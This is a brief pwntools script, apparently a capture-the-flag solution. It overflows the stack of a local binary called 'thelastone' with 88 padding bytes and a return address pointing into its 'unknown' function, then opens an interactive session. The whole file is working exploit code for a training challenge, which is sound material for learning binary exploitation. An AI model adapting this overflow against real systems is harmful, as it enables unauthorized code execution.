# script

```python
from pwn import *

p = process('./thelastone')

exe = ELF('./thelastone')

# gdb.attach(p, gdbscript = '''
# b*0x0000000000401519
# c
# ''')

# input()

p.sendlineafter(b'> ',b'5')

payload = b'A'*88
payload += p64(exe.sym['unknown']+5)

p.sendlineafter(b'> ',payload)

p.interactive()
```
